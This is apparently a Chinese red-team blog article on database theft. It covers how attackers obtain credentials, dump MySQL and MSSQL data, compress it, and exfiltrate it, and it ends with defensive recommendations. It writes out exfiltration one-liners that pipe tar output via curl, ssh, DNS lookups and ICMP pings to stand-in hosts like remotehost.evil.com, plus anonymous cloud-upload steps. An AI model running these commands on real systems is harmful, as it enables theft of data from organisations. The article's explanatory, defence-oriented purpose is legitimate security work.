## **概述**

2021年6月10日，《数据安全法》经第十三届全国人大常委会第二十九次会议通过并正式发布，于2021年9月1日起施行。

在实战攻防中，数据库一定是APT攻击者的主要目标之一。而围绕数据库产生的一系列攻防手段也层出不穷，有时候企业明明做好了各种安全措施，却未曾想，攻击者早已脱库跑路，留下管理员一脸懵，哪里出了问题呢？

未知攻，焉知防？在充分了解了攻击者获取数据库权限的途径和数据渗出的手段后，我们才能更好的进行有针对性的防御。

## 数据库权限的丢失

多数情况下，攻击者拿到网站权限，对应的数据库权限就到手了。在实际情况中，网站服务器和数据库服务器大多是分离的。尤其核心数据库对应的网站服务器一定是有着层层防护，并且对于防护较好的内网环境，核心数据库服务器应当是白名单访问的。以下是几种内网中数据库权限丢失的途径。

1.网站源码

最简单的就是攻击者直接在拿下web服务器后通过源码处获取。

2.弱口令

万恶之源不为过，图方便总是会成为网络安全建设的隐患。

3.管理员或者有权限的开发人员

通过管理员密码，或者管理员PC上的文件，管理员放在文件服务器上的文件，管理员邮箱，管理员的聊天记录，开发人员的相关文件或开发代码，总之跟管理员或者开发人员相关的一切，都有可能泄露数据库账号密码。

4.数据库服务器权限

攻击者通过漏洞或者其他方式拿下数据库服务器，直接本地登录数据库。

5.堡垒机

作为安全管理运维系统，在方便管理员的同时，如果自身出现问题，也可能会方便攻击者。当然也许堡垒机本身没有问题，出问题的是管理员，前面能泄露数据库密码，那也可能泄露堡垒机密码。

6.数据库备份文件泄露

详情请看下一节数据库备份。

## 数据库备份

攻击者想要拿走数据，必然要进行数据库备份，且应当尽量在命令行下完成，保证动静小，不影响业务运行，防止被管理员发现。同时，数据库备份对于数据库管理员来说也是必须要做的工作，如果不注意，反而方便了攻击者。如果攻击者能直接找到数据库备份文件，就直接省略了这一步。下面列举常见的一些数据库备份方法。

 **1.MySQL**

使用mysqldump：

    
    
    1导出整个数据库  
    2mysqldump -u 用户名 -p 数据库名 > 导出的文件名  
    3导出一个表  
    4mysqldump -u 用户名 -p 数据库名 表名> 导出的文件名  
    5举例：  
    6mysqldump --skip-lock-tables -h192.168.0.1 -uroot -proot TESTDB testtable > testtable.sql  
    7加上-h参数可以远程导出，--skip-lock-tables不锁表，对于使用中的数据库，尽量不对业务造成影响。适用于普通用户权限，更快一些。

对于大型数据库，单个表的条件参数备份：

    
    
    1mysqldump --single-transaction -w " id < 10000 and logintime < unix_timestamp('2014-06-01')" mydb mytable > mydump.sql  
    2-w 即where语句，--single-transaction保持事务一致性，不会锁表。

另外还有xtrabackup的两个主要工具：xtrabackup和innobackupex。如果有网站权限，且是PHP，对于一些小型数据库，管理脚本adminer.php也可能为攻击者所用。

 **2.MSSQL**

使用sql语句：

    
    
    1backup database [dbname] to disk='c:\windows\temp\db.bak' with init

缺点：只能在数据库本机备份，想异地备份需要建立共享管道，且会留下备份记录，不推荐。

使用bcp：

    
    
    1bcp 库名..表名 out D:\filename -c -Sservername -Usa -Ppassword

![1631955120_6145a8b0d362304caeec3.png!small?1631955121070](https://image.3001.net/images/20210918/1631955120_6145a8b0d362304caeec3.png!small?1631955121070)

同样的，bcp也可以使用条件语句备份，这样对于过大的表，可以分多次备份：

    
    
    1bcp "SELECT TOP 5 * FROM test.dbo.user" queryout c:\xxx.txt -q -w -k -E -S127.0.0.1 -Usa -P123456

-T 可信连接，在获取数据库机器权限却没有数据库密码时可使用本机登录，上面的命令可以简化：
    
    
    1bcp "SELECT TOP 5 * FROM test.dbo.user" queryout c:\xxx.txt -q -w -k -E -T

 **3.备份文件泄露**

其他数据库类型还有很多，不再一一列举。这里重点说一下，在数据库管理中，容灾备份也是管理员必须要做的工作之一。而数据库备份方式多种多样，冷备热备都有不同的要求，不管是本地backup目录直接保存，还是异地文件备份服务器存储，亦或者双机热备，实时同步。管理员都可能图一时方便，对备份数据的安全不够重视，这就容易给攻击者可乘之机。

## 打包压缩

攻击者在外传数据前，通常会对数据进行加密压缩。在Linux下，可以使用tar命令：

    
    
    1加密压缩  
    2tar -czvf - file | openssl des3 -salt -k passw0rd -out /path/to/file.tar.gz  
    3解密解压  
    4openssl des3 -d -k passw0rd -salt -in /path/to/file.tar.gz | tar xvf -
  

在Windows下有rar.exe或者7z.exe，这里介绍一下rar.exe的分卷压缩：

    
    
    1rar.exe a -m5 -v5g -hp123456 sql.rar *.sql  
    2a  添加到压缩文件  
    3-m5   最好      使用最大压缩方式(最好的压缩，但是最慢)  
    4-v5g 分卷压缩，每个卷大小5g，可自行设置。  
    5-hp 加密压缩，后面是压缩密码123456（我相信你不会用这个密码的，对吗？）  
    6sql.rar 是生成的压缩文件  
    7*.sql 是要添加压缩的文件，可以使用通配符，这里指目录下所有sql文件。

## 数据外传

 **1.web下载**

首先攻击者如果有web服务器权限，可以将打包好的数据放在网站目录下，通过web路径下载数据。这种情况下即使服务器不出网也能使用，而且稳定。但是容易被发现，下载量大会触发报警，在日常运维中还是比较好防护的。另外攻击者通常会使用多层匿名代理下载，流量成本较高，综合考虑大流量传输不是首选。

 **2.curl上传**

curl绝大多数时候都是白名单工具，功能强大，不止能访问网站，下载文件，也可以上传文件。win10更新后都自带curl.exe，单文件不到400k。

 **上传HTTPS**

curl -F 模拟表单提交，而通过管道可以防止本地生成文件。

    
    
    1tar zcf - localfolder | curl -F "data=@-" https://remotehost.evil.com/script.php

 **上传FTP**

这个前提是要有一个可访问ftp服务器。

    
    
    1列出ftp服务器上的目录列表：  
    2curl ftp://www.xxx.com/ --user name:passwd  
    3curl ftp://www.xxx.com/ –u name:passwd #简洁写法1  
    4curl ftp://name:passwd@www.xxx.com #简洁写法2  
    5只列出目录，不显示进度条  
    6curl ftp://www.xxx.com –u name:passwd -s  
    7下载一个文件：  
    8curl ftp://www.xxx.com/size.zip –u name:passwd -o size.zip  
    9上载一个文件到mp3目录下：  
    10curl –u name:passwd -T size.mp3 ftp://www.xxx.com/mp3/ #注意末尾的/不能少

 **3.通过各种隧道**

CS也好，MSF也好，类似的C2工具都有代理隧道功能，在Linux下同样有各种隧道传输的方法，使用起来都比较方便，但这些方法多数情况下不够稳定，不适合传输大文件。

 **cobalt strike建立隧道**

CS自带有下载功能，传输隧道取决于攻击者建立的通信隧道。也可以通过socks命令创建socks4a隧道。对于小文件的传输十分方便。

 **MSF建立隧道**

MSF常用的有auxiliary/server/socks4a与auxiliary/server/socks5两个代理模块，当拿到一个msf
shell时，即可使用代理模块进行数据传输。

 **ssh**

通过ssh隧道，直接将文件传输到远程服务器，同样的，通过管道不会写到本地磁盘，能有效规避文件监控。

    
    
    1tar zcf - localfolder | ssh remotehost.evil.com "cd /some/path/name; tar zxpf -"

 **DNS**

DNS流量不可能过大，通常只能传递小流量数据，但胜在隐蔽，很多时候容易被管理员忽略。

    
    
    1tar zcf - <file(s)> | xxd -p -c 8 | while read line; do host $line.<target> <remotehost>; done

 **ICMP**

同DNS类似，较隐蔽，但只适合小流量传输。

    
    
    1tar zcf - <file> | xxd -p -c 16 | while read line; do ping -p $line -c 1 <remotehost>; done

 **4.使用megatools上传网盘mega.nz**

mega.nz是国外的一个网盘，国内需要代理才能访问。跟某盘不同的是，它不限速，当然这也不重要，重要的是他可以使用匿名邮箱注册，并且新用户可以有70g的免费空间，这对于攻击者来说是隐藏身份的好方法。

megatools是它的命令行工具，主页地址：https://megatools.megous.com/
需要下载源码自行编译。使用时需要上传megatools和mega.ini两个文件，mega.ini里面配置账号密码，任务开始后可以删除。

mega.ini内容:

    
    
    1[Login]  
    2Username = testuser@protonmail.com  
    3Password = 123456

使用命令：

    
    
    1megatools.exe put --path /Root/ C:\File\1.rar --proxy "socks5://username:password@vp[shandiao]ndomain.com"

\--proxy可指定代理。

![1631955251_6145a933bb9dd1e60197f.png!small?1631955251937](https://image.3001.net/images/20210918/1631955251_6145a933bb9dd1e60197f.png!small?1631955251937)

5.使用cowtransfer-uploader上传到奶牛快传。

mega是国外的，奶牛快传则是国内的（珍惜它免费且不限速的日子吧，也许哪天就学某盘了）。

cowtransfer-uploader是github一个开源的命令行工具，使用go语言编写，有Linux，Windows和mac版本。

github地址：https://github.com/Mikubill/cowtransfer-uploader。

![1631955276_6145a94c7e1b4f60344bb.png!small?1631955276697](https://image.3001.net/images/20210918/1631955276_6145a94c7e1b4f60344bb.png!small?1631955276697)

匿名使用直接跟文件名即可：cowtransfer-uploader.exe 666.txt

![1631955300_6145a9647814dfee5c320.png!small?1631955300651](https://image.3001.net/images/20210918/1631955300_6145a9647814dfee5c320.png!small?1631955300651)

返回的984555是取件码，有了取件码就可以直接访问官网下载了。

![1631955327_6145a97ff070b9a0704fd.png!small?1631955329197](https://image.3001.net/images/20210918/1631955327_6145a97ff070b9a0704fd.png!small?1631955329197)

![1631955349_6145a995a7c84aebbfd62.png!small?1631955349810](https://image.3001.net/images/20210918/1631955349_6145a995a7c84aebbfd62.png!small?1631955349810)

可以看到有效时间只有24⼩时。

## 如何避免被脱库

既然知道了攻击者的攻击方法，作为管理人员，应该如何做好防护呢？针对上面几点，有以下思考。

 **1.避免数据库权限丢失**

\- 设置核心数据库服务器只能白名单访问，或者通过堡垒机进行统一认证管理。（这很管用）

\- 管理员（所有有数据库权限的使用者）即使在内网也要保护好自己（使用隔离的VLAN，安装杀软，文件监控，保持系统更新，谨慎开启445和3389等）。

\- 不同的业务使用不同的用户名和密码，不要使用弱口令，并且定期更改密码。（这三点很重要，在内网基本能拦截大部分针对数据库的攻击）

 **2.避免数据库备份被利用**

\- 数据库备份服务器应当有同级别的安全防护，包括流量监控，访问策略等。

\-如果有条件，可以安装DLP，对备份文件加密存储。比如亿赛通的DLP解决方案，可对本地文本文件，office文件,rar，zip压缩文件等多种类型文件进行加密，即使外传，攻击者也无法正常打开。

 **3.避免数据外传，减小损失。**

\- 网站服务器流量监控，异常的文件下载都应当被及时切断。

\- 设置数据库服务器不出网，同时应切断其DNS和ICMP的外网访问，这点很容易被管理者忽略。

\- 对访问mega.nz和cowtransfer.com的机器应重点关注，包括相对应的工具megatools和cowtransfer-uploader，尤其是服务器，如果没有业务需求，直接封杀也未尝不可。

\- 利用好网关的流量监控，对异常上传流量除了告警应对相应机器进行限速并立即排查，即使白名单ip，大流量访问也应当在监控报警范围内。

\- 攻击者可能会直接使用数据库服务器上传，也可能转移到其他服务器或者个人机进行上传，所以有条件可以对核心数据服务器或数据库服务器区进行单独的流量监控。

以上仅为个人浅见，安全之路漫漫，各位看官且行且珍惜。

本文章涉及内容仅限防御对抗、安全研究交流，请勿用于非法途径。

## 绿盟科技 M01N Team 战队

绿盟科技M01N战队专注于Red
Team、APT等高级攻击技术、战术及威胁研究，涉及Web安全、终端安全、AD安全、云安全等相关领域。通过研判现网攻击技术发展方向，以攻促防，为风险识别及威胁对抗提供决策支撑，全面提升安全防护能力。

公众号：M01N Team

![1628130370_610b4c42865fb37cd03b8.jpg!small?1628130373510](https://image.3001.net/images/20210805/1628130370_610b4c42865fb37cd03b8.jpg!small?1628130373510)

欢迎扫码关注公众号

  

